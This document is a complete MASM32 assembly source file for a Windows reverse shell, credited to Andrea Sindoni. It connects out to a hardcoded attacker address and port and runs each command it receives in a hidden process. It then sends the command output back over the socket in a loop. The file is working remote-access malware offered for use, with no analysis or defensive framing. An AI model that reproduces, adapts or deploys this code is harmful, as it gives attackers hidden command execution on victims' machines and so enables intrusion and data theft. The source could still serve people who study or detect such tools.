.586
.model flat,stdcall
option casemap:none
 
include /masm32/include/windows.inc
include /masm32/include/masm32.inc
include /masm32/include/gdi32.inc
include /masm32/include/user32.inc
include /masm32/include/kernel32.inc
include /masm32/include/wsock32.inc

includelib /masm32/lib/masm32.lib
includelib /masm32/lib/gdi32.lib
includelib /masm32/lib/user32.lib
includelib /masm32/lib/kernel32.lib
includelib /masm32/lib/masm32.lib
includelib /masm32/lib/wsock32.lib

.const
MEMSIZE equ 65535

.data
AppName     db "Reverse Shell | Andrea Sindoni @invictus1306",0

err0        db "An error occured while calling WSAStartup",0
err1        db "An error occured while creating a socket",0
err2        db "An error occured while connecting",0
err3        db "An error occured while calling gethostbyname",0
err4        db "An error occured while calling connect/recv",0
err5        db "An error occured while calling CreatePipe",0
err6        db "An error occured while calling GlobalAlloc/Free-GlobalLock/Unlock",0
err7        db "An error occured while calling CreateProcess",0
capt        db "Information",0
hostname    db "192.168.1.86",0 ; change it with your address
port        dd 4444 ; change port number

recbuf byte 1001 dup (0)
 
.data?

sock            dd ?
ErrorCode       dd ?
pipe_read       dd ?
pipe_write      dd ?
size_to_send    dd ?
bwr             dd ?
stored_buffer   dd ?
wsadata WSADATA <>
sin sockaddr_in <?>
security_attrib SECURITY_ATTRIBUTES <>
stinfo STARTUPINFO <>
pinfo PROCESS_INFORMATION <>
buffer db 1024 dup(?)
hMemory HANDLE ?

 
.code

show_error proc caption:ptr byte, err_txt:ptr byte
    invoke WSAGetLastError
    mov ErrorCode, eax
    invoke MessageBoxA, MB_OK, err_txt, caption, 0
    ret
show_error endp

show_error_1 proc caption:ptr byte, err_txt:ptr byte
    invoke GetLastError
    mov ErrorCode, eax
    invoke MessageBoxA, MB_OK, err_txt, caption, 0
    ret
show_error_1 endp

main proc

    invoke WSAStartup, 101h, addr wsadata
    cmp eax, 0
    jnz @error_wsa_startup
    invoke socket ,AF_INET, SOCK_STREAM, 0 ; Create a stream socket
    cmp eax, INVALID_SOCKET
    je @error_socket_creation
    mov sock, eax
    mov sin.sin_family, AF_INET
    invoke htons, port 
    mov sin.sin_port, ax
    invoke gethostbyname, addr hostname
    cmp eax, 0
    je @error_gethostbyname
    mov eax, [eax+12]   
    mov eax, [eax]      
    mov eax, [eax] ; copy ip address
    mov sin.sin_addr,eax
    invoke connect, sock, addr sin, sizeof sin
    cmp eax, SOCKET_ERROR
    je @error_socket_error

    @@receive_data_loop:
    invoke RtlZeroMemory, ADDR recbuf, sizeof recbuf
    invoke recv, sock, addr recbuf, 1000, NULL
    cmp eax, SOCKET_ERROR
    je @error_socket_error
   
    mov security_attrib.lpSecurityDescriptor,0
    mov security_attrib.bInheritHandle, TRUE
    mov security_attrib.nLength, sizeof SECURITY_ATTRIBUTES

    invoke CreatePipe, offset pipe_read, offset pipe_write, offset security_attrib, 0
    cmp eax, 0
    jz @error_creation_pipe
   
    mov stinfo.cb,sizeof STARTUPINFO
    mov eax, pipe_write
    mov stinfo.hStdOutput, eax
    mov stinfo.hStdError, eax
    mov stinfo.dwFlags, STARTF_USESHOWWINDOW+ STARTF_USESTDHANDLES
    mov stinfo.wShowWindow, SW_HIDE
   
    invoke CreateProcess, 0, ADDR recbuf, 0, 0, TRUE, 0, 0, 0, offset stinfo, offset pinfo
    or eax,eax
    invoke CloseHandle, pipe_write
    jz @error_create_process
   
    invoke RtlZeroMemory, ADDR buffer, sizeof buffer
   
    invoke GlobalAlloc, GMEM_MOVEABLE or GMEM_ZEROINIT, MEMSIZE
    cmp eax, 0
    je @error_global_alloc
   
    mov hMemory, eax
    invoke GlobalLock, hMemory
    cmp eax, 0
    je @error_global_lock
   
    mov stored_buffer, eax
    mov edi, [stored_buffer]
    xor ecx, ecx
    mov size_to_send, 0
   
    loop_:
        invoke ReadFile, pipe_read, offset buffer, 1024, offset bwr, 0
        add size_to_send, 1
        cmp eax, 0
        jz _found
       
        invoke lstrcat, edi, addr buffer ; append current buffer content to edi
        invoke RtlZeroMemory, addr buffer, sizeof buffer
    jmp loop_
       
    _found:
    xor eax, eax
    xor ecx, ecx
    mov ecx, 1024
    mov al, byte ptr [size_to_send]
    mul ecx ; I take a size that is multiple of 1024
    mov size_to_send, eax

    invoke send, sock, edi, size_to_send, 0
    cmp eax, SOCKET_ERROR
    je @error_connection
   
    invoke GlobalUnlock, hMemory
    cmp eax, 0
    jnz @error_global_lock
    invoke GlobalFree, hMemory
    cmp eax, 0
    jnz @error_global_alloc   
   
    jmp @@receive_data_loop
   
    exit:
    invoke closesocket, sock
    cmp eax, INVALID_SOCKET
    je @error_socket_creation
    invoke WSACleanup
    invoke ExitProcess,0
   
    @error_wsa_startup:
    invoke show_error, offset capt, offset err0
    jmp exit
   
    @error_socket_creation:
    invoke show_error, offset capt, offset err1
    jmp exit
   
    @error_connection:
    invoke show_error, offset capt, offset err2
    jmp exit

    @error_gethostbyname:
    invoke show_error, offset capt, offset err3
    jmp exit
   
    @error_socket_error:
    invoke show_error, offset capt, offset err4
    jmp exit
   
    @error_creation_pipe:
    invoke show_error, offset capt, offset err5
    jmp exit
   
    @error_create_process:
    invoke show_error_1, offset capt, offset err7
    jmp exit
   
    @error_global_alloc:
    invoke show_error_1, offset capt, offset err6
    jmp exit
   
    @error_global_lock:
    invoke show_error_1, offset capt, offset err6
    jmp exit

main endp

end main

end start
